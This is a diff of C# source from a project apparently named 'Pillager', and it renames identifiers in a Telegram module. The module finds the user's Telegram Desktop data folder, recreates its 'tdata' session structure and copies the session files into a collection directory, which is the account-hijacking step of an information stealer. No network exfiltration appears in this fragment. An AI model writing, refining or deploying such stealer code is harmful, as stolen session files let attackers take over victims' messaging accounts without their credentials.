@@ -1,20 +1,20 @@
 ﻿using System;
 using System.IO;
 
-namespace Pillager.IM
+namespace Pillager.Messengers
 {
     internal class Telegram
     {
-        public static string IMName = "Telegram";
+        public static string MessengerName = "Telegram";
 
-        public static string IMPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");
+        public static string MessengerPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");
 
         public static void Save(string path)
         {
             try
             {
-                if (!Directory.Exists(IMPath)) return;
-                string savepath = Path.Combine(path, IMName);
+                if (!Directory.Exists(MessengerPath)) return;
+                string savepath = Path.Combine(path, MessengerName);
                 Directory.CreateDirectory(savepath);
                 string[] sessionpaths =
                 {
@@ -38,9 +38,9 @@ namespace Pillager.IM
                 Directory.CreateDirectory(savepath + "\\tdata\\0CA814316818D8F6");
                 foreach (var sessionpath in sessionpaths)
                 {
-                    if (File.Exists(Path.Combine(IMPath, sessionpath)))
+                    if (File.Exists(Path.Combine(MessengerPath, sessionpath)))
                     {
-                        File.Copy(Path.Combine(IMPath, sessionpath), Path.Combine(savepath, sessionpath), true);
+                        File.Copy(Path.Combine(MessengerPath, sessionpath), Path.Combine(savepath, sessionpath), true);
                     }
                 }
             }
